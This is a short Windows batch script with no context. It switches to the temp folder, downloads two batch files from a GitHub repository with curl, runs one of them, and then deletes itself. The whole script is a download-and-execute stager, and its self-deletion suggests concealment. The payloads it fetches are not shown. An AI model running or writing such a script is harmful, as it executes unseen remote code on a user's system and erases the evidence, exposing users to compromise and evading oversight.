cd %temp%
curl -O https://raw.githubusercontent.com/Z-tech2/cmdBP/main/comm.bat
curl -O https://raw.githubusercontent.com/Z-tech2/cmdBP/main/del.bat
start %temp%\del.bat
del %0
